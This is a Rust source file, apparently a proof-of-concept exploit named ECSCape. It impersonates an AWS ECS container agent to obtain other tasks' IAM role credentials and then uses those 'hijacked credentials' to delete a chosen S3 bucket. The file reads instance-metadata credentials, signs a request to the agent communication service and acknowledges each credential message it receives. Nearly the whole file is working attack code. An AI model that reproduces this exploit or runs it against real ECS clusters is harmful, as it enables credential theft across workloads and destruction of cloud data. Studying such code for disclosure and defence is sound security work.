use anyhow::{Result, anyhow};
use aws_sdk_ecs::Client as ECSClient;
use aws_sdk_ecs::config::{Credentials, SharedCredentialsProvider};
use aws_sdk_s3::Client as S3Client;
use aws_sdk_s3::config::Region as S3Region;
use aws_sdk_s3::config::{Builder as S3ConfigBuilder, Credentials as S3Credentials};
use aws_types::SdkConfig;
use aws_types::region::Region;
use futures_util::{SinkExt, StreamExt};
use tracing::{debug, info};
use url::Url;

use crate::config::{
    ACS_PROTOCOL_SEC_NUM, ACS_PROTOCOL_SEND_CREDENTIALS, ACS_PROTOCOL_VERSION, DOCKER_VERSION,
};
use crate::container_credentials::ContainerCredentials;
use crate::ecs_agent_metadata::ECSAgentMetadata;
use crate::ecs_protocol_client::ECSProtocolClient;
use crate::imds_metadata::IMDSMetadata;
use crate::structs::{IAMRoleCredentials, IAMRoleCredentialsAckRequest, ProtocolMessage};
use crate::utils::{build_ws_url, create_sigv4_signed_request};

pub struct ECSCape {
    imds_metadata: IMDSMetadata,
    ecs_agent_metadata: ECSAgentMetadata,
    container_credentials: ContainerCredentials,
}

impl ECSCape {
    pub async fn try_new() -> Result<Self> {
        let imds_metadata = IMDSMetadata::try_new().await?;
        debug!("imds metadata: {:#?}", imds_metadata);

        let ecs_agent_metadata = ECSAgentMetadata::try_new(&imds_metadata.local_ip).await?;
        debug!("ecs agent metadata: {:#?}", ecs_agent_metadata);

        let container_credentials = ContainerCredentials::try_new().await?;
        debug!("container credentials: {:#?}", container_credentials);

        Ok(Self {
            imds_metadata,
            ecs_agent_metadata,
            container_credentials,
        })
    }

    pub async fn start(&self, s3_bucket: String) -> Result<()> {
        info!("trying to delete s3 bucket: {s3_bucket}");

        let acs_url = self.get_acs_url().await?;
        debug!("acs url: {:#?}", acs_url);

        let signed_request = create_sigv4_signed_request(
            acs_url,
            &self.imds_metadata.aws_region,
            self.container_credentials.access_key_id.clone(),
            self.container_credentials.secret_access_key.clone(),
            self.container_credentials.token.clone(),
        )?;

        let acs_client = ECSProtocolClient::new(signed_request);
        let (mut recv_stream, send_sink) = acs_client.connect().await?;

        while let Some(msg) = recv_stream.next().await {
            match msg? {
                ProtocolMessage::IAMRoleCredentialsMessage(role_creds) => {
                    info!("ACS received role creds: {:#?}", role_creds);

                    let ack_request = IAMRoleCredentialsAckRequest {
                        message_id: role_creds.message_id.clone(),
                        expiration: role_creds.role_credentials.expiration.clone(),
                        credentials_id: role_creds.role_credentials.credentials_id.clone(),
                    };

                    send_sink
                        .lock()
                        .await
                        .send(ProtocolMessage::IAMRoleCredentialsAckRequest(ack_request))
                        .await?;

                    match self
                        .delete_s3_bucket(&s3_bucket, role_creds.role_credentials)
                        .await
                    {
                        Ok(_) => {
                            info!("successfully deleted s3 bucket: {s3_bucket}");
                            break;
                        }
                        Err(err) => {
                            info!("failed to delete s3 bucket: {:#?}", err);
                        }
                    }
                }
                msg => {
                    debug!("ACS received message: {:#?}", msg);
                }
            }
        }

        Ok(())
    }

    async fn delete_s3_bucket(&self, bucket: &str, creds: IAMRoleCredentials) -> Result<()> {
        info!(
            "Attempting to delete S3 bucket {} using hijacked credentials: {:#?}",
            bucket, creds
        );

        let hijacked_creds = S3Credentials::new(
            &creds.access_key_id,
            &creds.secret_access_key,
            Some(creds.session_token),
            None,
            "IMDS",
        );

        let config = S3ConfigBuilder::new()
            .region(S3Region::new(self.imds_metadata.aws_region.clone()))
            .credentials_provider(hijacked_creds)
            .build();

        let s3 = S3Client::from_conf(config);

        s3.delete_bucket().bucket(bucket).send().await?;

        Ok(())
    }

    fn build_acs_url(&self, poll_endpoint_url: &str) -> Result<Url> {
        let mut url = build_ws_url(poll_endpoint_url)?;
        url.query_pairs_mut()
            .append_pair("agentHash", &self.ecs_agent_metadata.ecs_agent_hash)
            .append_pair("agentVersion", &self.ecs_agent_metadata.ecs_agent_version)
            .append_pair("clusterArn", &self.ecs_agent_metadata.cluster_arn)
            .append_pair(
                "containerInstanceArn",
                &self.ecs_agent_metadata.container_instance_arn,
            )
            .append_pair("dockerVersion", DOCKER_VERSION)
            .append_pair("protocolVersion", ACS_PROTOCOL_VERSION)
            .append_pair("seqNum", ACS_PROTOCOL_SEC_NUM)
            .append_pair(
                "sendCredentials",
                &ACS_PROTOCOL_SEND_CREDENTIALS.to_string(),
            );

        Ok(url)
    }

    async fn get_acs_url(&self) -> Result<Url> {
        let ecs_client = ECSClient::new(
            &SdkConfig::builder()
                .credentials_provider(SharedCredentialsProvider::new(Credentials::new(
                    self.imds_metadata.aws_access_key_id.clone(),
                    self.imds_metadata.aws_access_secret_key.clone(),
                    Some(self.imds_metadata.aws_access_token.clone()),
                    None,
                    "IMDS",
                )))
                .region(Region::new(self.imds_metadata.aws_region.clone()))
                .build(),
        );

        let poll_endpoint = ecs_client
            .discover_poll_endpoint()
            .cluster(&self.ecs_agent_metadata.cluster_arn)
            .container_instance(&self.ecs_agent_metadata.container_instance_arn)
            .send()
            .await?;

        let poll_endpoint_url = poll_endpoint
            .endpoint()
            .ok_or(anyhow!("no acs endpoint url"))?;

        let acs_url = self.build_acs_url(poll_endpoint_url)?;

        Ok(acs_url)
    }
}
